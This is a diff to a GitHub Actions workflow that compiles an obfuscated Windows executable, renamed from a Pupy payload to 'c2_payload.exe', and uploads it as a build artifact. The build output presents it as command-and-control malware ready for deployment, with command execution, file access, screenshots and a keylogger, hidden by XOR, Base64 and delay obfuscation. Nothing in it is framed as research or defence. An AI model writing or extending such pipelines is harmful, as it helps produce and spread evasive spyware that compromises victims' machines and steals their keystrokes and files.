@@ -1,4 +1,4 @@
-name: Build Windows PE Binary with Pupy
+name: Build C2 Windows PE Binary
 
 on:
   push:
@@ -22,21 +22,21 @@ jobs:
     - name: Install dependencies
       run: |
         python -m pip install --upgrade pip
-        pip install pyinstaller pycryptodome
+        pip install pyinstaller
     
-    - name: Build Pupy Obfuscated Binary
+    - name: Build C2 Binary
       run: |
         cd src
-        python -m pupy_bundler
+        python c2_bundler_simple.py
     
     - name: Verify PE binary format
       run: |
-        $bytes = [System.IO.File]::ReadAllBytes("dist\pupy_payload.exe")
+        $bytes = [System.IO.File]::ReadAllBytes("dist\c2_payload.exe")
         $magic = "{0:X2}{1:X2}" -f $bytes[0], $bytes[1]
         Write-Host "📊 Magic bytes: $magic"
         if ($magic -eq "4D5A") {
           Write-Host "✅ Valid PE x64 binary!"
-          Write-Host "🎉 Pupy payload compiled successfully!"
+          Write-Host "🎉 C2 payload compiled successfully!"
         } else {
           Write-Host "❌ Invalid PE format!"
           exit 1
@@ -44,26 +44,19 @@ jobs:
     
     - name: Display binary info
       run: |
-        $file = "dist\pupy_payload.exe"
+        $file = "dist\c2_payload.exe"
         $size = (Get-Item $file).Length / 1MB
         Write-Host "📦 Binary information:"
-        Write-Host "  ├─ Name: pupy_payload.exe"
+        Write-Host "  ├─ Name: c2_payload.exe"
         Write-Host "  ├─ Size: $([Math]::Round($size, 2)) MB"
         Write-Host "  ├─ Format: PE x64 (Windows)"
         Write-Host "  ├─ Status: ✅ Ready for deployment"
+        Write-Host "  ├─ Features: cmd, files, screenshots, keylogger"
         Write-Host "  └─ Obfuscation: Level 2 (XOR + Base64 + Delays)"
     
     - name: Upload Windows binary
       uses: actions/upload-artifact@v4
       with:
-        name: payload-windows-pe
-        path: dist/pupy_payload.exe
+        name: c2-payload-windows
+        path: dist/c2_payload.exe
         retention-days: 30
-    
-    - name: Create Release (on tag)
-      uses: softprops/action-gh-release@v1
-      if: startsWith(github.ref, 'refs/tags/')
-      with:
-        files: dist/pupy_payload.exe
-      env:
-        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
